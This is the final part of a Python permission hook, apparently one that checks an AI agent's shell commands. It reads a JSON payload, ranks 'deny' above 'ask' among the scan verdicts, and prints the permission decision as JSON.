        return {"permissionDecision": "allow"}

    verdicts = _scan(cmd)
    # deny beats ask; first reason of the winning class is reported
    for decision in ("deny", "ask"):
        for verdict, reason in verdicts:
            if verdict == decision:
                return {"permissionDecision": verdict, "permissionDecisionReason": reason}
    return {"permissionDecision": "allow"}


def main() -> None:
    try:
        payload = json.loads(sys.stdin.read() or "{}")
    except json.JSONDecodeError:
        payload = {}
    sys.stdout.write(json.dumps(_decide(payload)))
    sys.stdout.flush()


if __name__ == "__main__":
    main()
